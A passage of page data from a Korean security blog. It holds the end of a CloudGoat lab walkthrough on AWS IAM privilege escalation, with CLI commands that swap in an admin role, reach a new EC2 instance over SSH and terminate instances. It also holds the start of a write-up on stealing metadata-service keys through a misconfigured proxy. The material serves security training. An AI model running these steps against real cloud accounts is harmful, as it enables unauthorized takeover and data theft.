property\">\"ThreadsPerCore\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CapacityReservationSpecification\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CapacityReservationPreference\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"open\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"MetadataOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpTokens\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"optional\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpPutResponseHopLimit\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpEndpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"enabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnclaveOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Enabled\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"ReservationId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"r-04495e19ef68a6678\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"최고-관리자-iam-instance-프로필을-새로운-ec2-instance로-변경\" style=\"position:relative;\"><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\" aria-label=\"최고 관리자 iam instance 프로필을 새로운 ec2 instance로 변경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</h3>\n<ul>\n<li>앞서 새로운 EC2 Instance를 생성했습니다. 인스턴스 Rule <code class=\"language-text\">cg-ec2-meek-instance-profile-/cloud-goat-id</code> 은 여전히 권한이 낮은 IAM Rule이기 때문에 이를 제거하고 인스턴스 프로파일에 IAM 역할을 추가하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name cg-ec2-meek-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name cg-ec2-mighty-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\n<span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<h3 id=\"ssh를-통해-새로운-ec2에-액세스\" style=\"position:relative;\"><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\" aria-label=\"ssh를 통해 새로운 ec2에 액세스 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH를 통해 새로운 EC2에 액세스</h3>\n<ul>\n<li>앞서 새로 생성된 EC2 인스턴스에 SSH로 접속해 보겠습니다. 미리 만들어 두었던 SSH 개인 키에 대한 권한 을 변경해주었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQY023MXW/SUACA4ZPB5kzBjbkUKZUB/bCUQml7Dod2tGXsQzDbjJqoF/4B4/+/fo3bhTHx4kneq1esRxF7u2Bra/bnimF7TOt8QHoasjcW3LZidu2EOyPmzpjzvhVzdRSyPvApGz7lwb+EN8sxukM6fZdArXFDSZrV2H6MmxUM5wpPFvTCDGue03EixIsTRKOFaP5HFK2w7YCLYYTW14RTTaau8ANJkpTMZgVpWhFMNHl5z9jNeHls0mx0OGyePTt8dtQ8Qzh+ymtzTNfySeUG788oq3BGEZOpZhKtCKPVU+v8+qnNNy4nnQFGu48Q7b8arxBSljheTBBmVJs9SlXk9Qd6cc0iK1HLDYv0kji5RC5rwqnCsn36b9/R7TmY3TE9y8O0HEbHA8TP3Y7H+wfK+obPX77z8eET28dvXHz9hSo2yCwnmMQkqWapS6QqyGROXtSo5Rq9qqiqG1bVlh+nmt8XG7B4I7ji+gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"15\"\n        title=\"15\"\n        src=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png\"\n        srcset=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/e9ff0/15.png 180w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/f21e7/15.png 360w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png 720w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/9a86a/15.png 792w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로 생성된 EC2 인스턴스의 공용 IP 대역을 query를 조회하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n --query <span class=\"token string\">\"Reservations[*].Instances[*].PublicIpAddress\"</span> \\\n --output text \\\n --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY013MyU7CUACF4ZvgBKghUEpACKCU21460TpFY0mD1QDGKeKwcOnOV3BR9XF8x9/YEGNcfDmLc3JELG2ep1OC/WOiKCEeTzg/u6B384IXzzgdJbyqKal7x0f4mEmH97wHD7w5t6T+nM/dJ1J3ztfyNUIvNek0Jc32AEOGbLUUmr5DXe9SrW5T1rpYZQt7U2KXTLyKjVcZ0Flq0RC1TF3oWWq5GqJa76PcI4bhKDsqbjQQooAQq4v8kV9Y+yP/ry8gckWE4x5weTXnJEowVUBfeigVsO6PqRlDLOnR7pj0DAdLBUjTxzBcbGfvd+v5hwxUyGTF5hsyCHVl/RUeOQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"16\"\n        title=\"16\"\n        src=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png\"\n        srcset=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/e9ff0/16.png 180w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/f21e7/16.png 360w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png 720w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/4e6ec/16.png 827w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>3개 가 출력된 것은 기존에 만들어 두었던 인스턴스가 걸린 정보이고 새로운 정보는 큐형태로 마지막 <code class=\"language-text\">3.90.208.120</code> IP 대역입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">ssh -i fake-ec2.pem ubuntu@<span class=\"token number\">3.90</span>.<span class=\"token number\">208.120</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXElEQVQ4y31T2VLbQBBcg40PHT51WPKl+wLbspBdAkICpCp5yv//TadmhF0GnDxM9e5ObW9Pz6z4sylQ7h8Rp/fI7vYodg/wq19IDm/Y75+xyR9wqF6x3lZYLBOsnAyev0YY5XCcDOY8gDdwUXUSHOQU4r58QXZXIS++Y5N/gxfuUORPqKqfKPavKA9veHj6zbjdPXPsyh8oyhcMRksI0YNoKBBXUh3J7QH2PEEY38PxNli5a5h2hCAq4AVbWLMYbrDlnOvXOJqs0B/O0ZVMXDWHuG4O0WyOOIRphYiSErrpQ1Kt02U/zJlgtkghqzZfFIKU9CEaKkfjesDnhMe1mC8zJqRXqYRaWX7CJDvAD3eca7XHtaLWkPFIdlwz4UR3WZ1m+JgYHnqyiU7PgNK3MbUjPqfSSCXFUeVnZSdC8i5O96DSSS1dIjJ1MMPKW3POsEKuQDM8Rlm1TqSfQ5DpVB75ZS9SqIM5SDVdNKYBqycc6y5a7QmrJ/ys7ERI3SJSMp+6XWPKimk/tWPOU9lEQsouNeNESMpoVHQzYIL56hajiVN3UkgQQq6D9tThM/8uKmx3dX693dXQlQnrPZV205ngpqPhpquh09P5rN3TPyj8Qkj+xWkJL8wRpSV7SWdBtEMQF7jbPGLh3LIVlDsv/6LC2TJjv8j8sebwBdqbVsQkZAV1nJQRUU+e/p+QhpZepiE+dpZwrLkcSn/GQ13Pa8CzSXjdGl0u+aiO/7AVskJaEwn5KSlW7d27t5Iy5Vn9J6E6nkIZm5CGBpSRCXnw/m/PuvohGv0v//ic8C+FZpOvQkSe2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"17\"\n        title=\"17\"\n        src=\"/static/76a4fa87e881ac50c20140b663badf06/37523/17.png\"\n        srcset=\"/static/76a4fa87e881ac50c20140b663badf06/e9ff0/17.png 180w,\n/static/76a4fa87e881ac50c20140b663badf06/f21e7/17.png 360w,\n/static/76a4fa87e881ac50c20140b663badf06/37523/17.png 720w,\n/static/76a4fa87e881ac50c20140b663badf06/65654/17.png 872w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>성공 적으로 연결이 완료되었다면 <code class=\"language-text\">cg-ec2-mighty-role-/cloud goat id/</code> 연결된 IAM Rule 및 정책을 열거하겠습니다.</li>\n<li>SSH 연결한 EC2 인스턴스에 AWS CLI를 설치 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-policies --query <span class=\"token string\">\"Policies[?starts_with(PolicyName, 'cg')]\"</span>\n\n aws iam get-policy-version \\\n --policy-arn <span class=\"token string\">\"arn:aws:iam::ACCOUNT-ID:policy/cg-ec2-mighty-policy\"</span>  \\\n --version-id <span class=\"token string\">\"v1\"</span></code></pre></div>\n<ul>\n<li>해당 서버에서 EC2 인스턴스 관리자 권한을 획득한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances --region us-east<span class=\"token number\">-1</span>\n aws ec2 terminate-instances --instance-ids &lt;instanceId> --region us-east<span class=\"token number\">-1</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#kerrigan-iam-profile\">Kerrigan IAM Profile</a></li>\n<li><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\">권한 역활을 파악하는 방법</a></li>\n<li><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\">EC2 Key pair 생성</a></li>\n<li><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\">최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</a></li>\n<li><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\">SSH를 통해 새로운 EC2에 액세스</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 5 [Scenario 4]:  IAM Privilege Escalation By Attachment 시나리오 개요 자원 vpc (EC2) 1 IAM User 취약점 IAM User “Kerrigan”  권한이 있는 공격자는 액세스 권한이 있는 사용자에게 정책을 연결하고 해당 정책에 대한 권한을 공격자에게 추가하여 권한을 상승시킬 수 있습니다. 목표 EC2 instance “cg-super-critical-security-server.”를 삭제하는 것! 접근 권한 구성이 갖쳐져 있는 환경에서 공격자는  권한을 활용하여 현재 권한이 아닌 높은 권한으로 새로운 EC2 인스턴스를 생성할 수 있습니다. 새로운 EC2 인스턴스에서 액세스를 통해 공격자는 대상 계정 내에서 모든 관리 권한을 획득합니다.  를 삭제를 합니다. exploit 흐름도  시나리오 환경설정   exploit 시나리오 흐름도 공격자는 IAM 사용자 “Kerrigan”으로 시작하여 높은 수준의 …","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 5 (CloudGoat: IAM Privilege Escalation By Attachment)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-5/"}},"next":{"id":"cbd8c0f7-ec77-5d99-8436-43038a368e52","html":"<h1 id=\"클라우드-서비스-취약점-분석-4\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-4\" aria-label=\"클라우드 서비스 취약점 분석 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 4</h1>\n<h1 id=\"scenario-3--cloud-breach-s3\" style=\"position:relative;\"><a href=\"#scenario-3--cloud-breach-s3\" aria-label=\"scenario 3  cloud breach s3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 3]:  Cloud Breach s3</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Small\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create cloud_breach_s3</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>VPC (EC2, S3)</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>개발자의 실수로 인한 ReverseProxy 환경 구성 미흡</li>\n<li>설정 값이 잘못 구성되어 Reverse Proxy로 동작하는 EC2 서버의 IP 주소</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>S3 bucket에서 Confidential files을 다운로드 합니다.</li>\n<li>액세스 권한이 없는 상태인 외부 접근자로 시나리오는 시작합니다. 설정이 잘못된 Reverse Proxy server를 Exploit하여 EC2 MetaData Service를 통해 인스턴스 프로필 키를 획득합니다. 그런 다음 해당 키를 사용하여 S3 Bucket에서 권한을 우회하여 데이터를 추출합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADRElEQVQoz02SX0xTdxTHj1Pa+7stBSRpb/v73Vt6W0sprNgsUArtNKxDWm5BMGoRccw5txn/bJOZGTdl04QtaqkwIyhIolHqMrNMEEVtwgNGl7GaLG6Z2Ysxe9r2sE1UejU55uqy+HAezsk533y++R6QZZfRW17Z6PX6/IgI1bWNHwTqYt9V10bPBsNKOhbvSMeaO9JKS2d6RVMiXROKpQN10TFtpyq4IqHdyE43zxgjjDEdiKJEPJ5yR6mnggGAJvhFoC72c3Vt9GYwrPygtHZl461d2ZZVG7Ox5s5sMNycrQnFZ2tC8V+rQ807cK4CZNll+E9QD5RSjid5i4oK8/O04eQswpZdp2Dnxyfg/eRt2H0eYd8FhOPXEUZmELpP3ofukfuw4dCfkBhC+BERJJePUKuFUEr1wBjjRMaIKNnJkuBKgz/clO9/vasgH0AfejcjN+zPZdYk1RubjuWubh3OZd4ZzGU2D+audR6Zv9rUq/4U+ezhIc2Z0xcxiHZZI7RxTLQTodjE3UOEOUT4GxEmESG4+QqL9DxIRQ/Mf736sHprXUr9fm1SnW1PqbPxXnWm4fNHY5G9/+wAgJfk8jDPpBI9SLKbE0x5nGfZKuNrw/92rhn+bWfryO8fLT/2VwQAFm7NIkQ/nLavTeYmEn1qJtGnTnccUacThx8c1ALpRwSHt46nNuG5ZYc3QAoAdJXrR4ob+x//8dbAL7h+4C5GUk/SQ4jgbztYpBGEtmdf7kg9mtrQP3+t7cu5o4tLwkbZHze6q9oM1CZw/4dS4vSRChPo4ZVMQU/PpXN9ewduJXtO3O7+dGa3RlBf5Sa2cYRRRFj+9nlTZNcdsb79AKm9ggCIQB0+ntksHKUvpMxEiZjNxVwp8KQQ2nkK9TyDIuIVQLfA9d5iU8N4L2udGrYok19ZW6ZOmpWLA2bl8mndq9+8qYkKrrCBUvpcUEtZa0RRJFa3xEmlHMc8Js7qLiNlFtAvcr5RaIp8u42tvLhPiE98YlHG9wjKxB5z08R+XWis5TTAAsEZ4F/8Q71GSSnj7PZS4nCUPStJkjkrtXNu20K98SjCsjMI/lGEylGEpaMIZf0I8BDB5qgkzGZ+BkUp1T0FXJ4gj4FcqqIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"29.png\"\n        title=\"29.png\"\n        src=\"/static/47ff7d97423579247e2d9cb0309d3849/37523/29.png\"\n        srcset=\"/static/47ff7d97423579247e2d9cb0309d3849/e9ff0/29.png 180w,\n/static/47ff7d97423579247e2d9cb0309d3849/f21e7/29.png 360w,\n/static/47ff7d97423579247e2d9cb0309d3849/37523/29.png 720w,\n/static/47ff7d97423579247e2d9cb0309d3849/302a4/29.png 